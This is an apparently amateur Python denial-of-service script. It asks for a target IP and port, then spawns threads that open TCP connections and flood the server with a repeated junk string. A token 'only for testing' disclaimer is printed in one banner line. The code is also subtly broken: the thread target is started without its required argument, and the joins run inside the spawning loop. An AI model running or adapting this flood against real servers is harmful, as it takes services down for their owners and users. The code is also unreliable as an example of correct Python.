from socket import socket, AF_INET, SOCK_STREAM
import threading

print('''
 __       __  _______       _______    ______    ______  ________ 
|  \     /  \|       \     |       \  /      \  /      \|        \
| $$\   /  $$| $$$$$$$\    | $$$$$$$\|  $$$$$$\|  $$$$$$\\$$$$$$$$
| $$$\ /  $$$| $$__| $$    | $$__/ $$| $$  | $$| $$  | $$  | $$   
| $$$$\  $$$$| $$    $$    | $$    $$| $$  | $$| $$  | $$  | $$   
| $$\$$ $$ $$| $$$$$$$\    | $$$$$$$\| $$  | $$| $$  | $$  | $$   
| $$ \$$$| $$| $$  | $$ __ | $$__/ $$| $$__/ $$| $$__/ $$  | $$   
| $$  \$ | $$| $$  | $$|  \| $$    $$ \$$    $$ \$$    $$  | $$   
 \$$      \$$ \$$   \$$ \$$ \$$$$$$$   \$$$$$$   \$$$$$$    \$$   
                                                                  
                                                                  
                                                                  
''')
print("<<<<this tool only for testing do ont use this tool for  To drop the service>>>>")
port = int(input("put port the Server"))
print('''
##      ##    ###    ########  ##    ## #### ##    ##  ######   
##  ##  ##   ## ##   ##     ## ###   ##  ##  ###   ## ##    ##  
##  ##  ##  ##   ##  ##     ## ####  ##  ##  ####  ## ##        
##  ##  ## ##     ## ########  ## ## ##  ##  ## ## ## ##   #### 
##  ##  ## ######### ##   ##   ##  ####  ##  ##  #### ##    ##  
##  ##  ## ##     ## ##    ##  ##   ###  ##  ##   ### ##    ##  
 ###  ###  ##     ## ##     ## ##    ## #### ##    ##  ######   

''')
ip_adress = str(input("put ip the Server"))
def dos_attack(ip_adress):
    dos = socket(AF_INET, SOCK_STREAM)
    dos.connect((ip_adress,port))
    a = 0
    d = 10
    f = 15
    h = 120
    while a < h:
        a = a + 1 * f * d * h
        array = ["qwerty#uiopasdfghjklzxcvbnm_AQWERTYUIOPASDFGHJKLMNBVCXZ&**_+_(*_)*)_+*+_&_)*&)&^$^(^%&($%^*#$@$&%#%^@&^#$^!%!@~~%~%#@~^%$^#^&%$&%$^*^%(&()&*)*(_)(+&*+_)(*&^%^$#@~!@@$#$%$#%^&%(&*)(_(+_*-<><><><>??/.;/.,/.,.,/../,"]
        array = array * a
        for i in array:
            i = str(i).encode("utf-8")
            dos.send(i)
            print("The attack was carried out (ok)....")
thread = []
for i in range(10000000):
    th1 = threading.Thread(target=dos_attack)
    th1.start()
    thread.append(th1)
    for th2 in thread:
        th2.join()
